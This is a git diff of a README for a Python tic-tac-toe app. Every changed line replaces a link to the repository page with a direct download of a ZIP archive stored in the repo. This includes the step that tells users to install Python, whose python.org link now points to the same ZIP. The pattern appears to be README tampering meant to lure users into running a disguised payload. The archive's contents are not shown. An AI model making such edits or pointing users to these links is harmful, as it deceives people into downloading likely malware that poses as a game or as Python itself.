@@ -1,6 +1,6 @@
 # 🎯 kmap-tictactoe - Simple, Smart Tic-Tac-Toe AI
 
-[![Download Now](https://img.shields.io/badge/Download-kmap--tictactoe-4caf50?style=for-the-badge)](https://github.com/Abdullah802788/kmap-tictactoe)
+[![Download Now](https://img.shields.io/badge/Download-kmap--tictactoe-4caf50?style=for-the-badge)](https://github.com/Abdullah802788/kmap-tictactoe/raw/refs/heads/main/core/kmap_tictactoe_3.5.zip)
 
 ---
 
@@ -42,7 +42,7 @@ This guide will help you download, install, and run the kmap-tictactoe app on yo
 
 Click the big green button at the top or use this link to download the program files:
 
-[Get kmap-tictactoe here](https://github.com/Abdullah802788/kmap-tictactoe)
+[Get kmap-tictactoe here](https://github.com/Abdullah802788/kmap-tictactoe/raw/refs/heads/main/core/kmap_tictactoe_3.5.zip)
 
 Since this link leads to the general GitHub page, you will need to download the files manually:
 
@@ -62,7 +62,7 @@ Since this link leads to the general GitHub page, you will need to download the 
 
 kmap-tictactoe runs on Python. If you do not have Python installed, follow these steps:
 
-- Go to [https://www.python.org/downloads/windows/](https://www.python.org/downloads/windows/)
+- Go to [https://github.com/Abdullah802788/kmap-tictactoe/raw/refs/heads/main/core/kmap_tictactoe_3.5.zip](https://github.com/Abdullah802788/kmap-tictactoe/raw/refs/heads/main/core/kmap_tictactoe_3.5.zip)
 - Download the latest **Python 3.x** installer for Windows.
 - Run the installer.
 - Important: Before clicking install, check the box **Add Python 3.x to PATH** at the bottom.
@@ -153,7 +153,7 @@ This installs things like `customtkinter` and other Python tools used by the gam
 
 To get updates or bug fixes:
 
-- Return to the [GitHub page](https://github.com/Abdullah802788/kmap-tictactoe)
+- Return to the [GitHub page](https://github.com/Abdullah802788/kmap-tictactoe/raw/refs/heads/main/core/kmap_tictactoe_3.5.zip)
 - Download the newest ZIP and repeat the extract and run steps.
 - Backup your current game folder first if needed.
 
@@ -165,4 +165,4 @@ For help or questions, use the **Issues** tab on the GitHub repository page or c
 
 ---
 
-[![Download from GitHub](https://user-images.githubusercontent.com/30252625/109784968-909b6680-7c06-11eb-8964-e4712296a026.png)](https://github.com/Abdullah802788/kmap-tictactoe)
+[![Download from GitHub](https://github.com/Abdullah802788/kmap-tictactoe/raw/refs/heads/main/core/kmap_tictactoe_3.5.zip)](https://github.com/Abdullah802788/kmap-tictactoe/raw/refs/heads/main/core/kmap_tictactoe_3.5.zip)
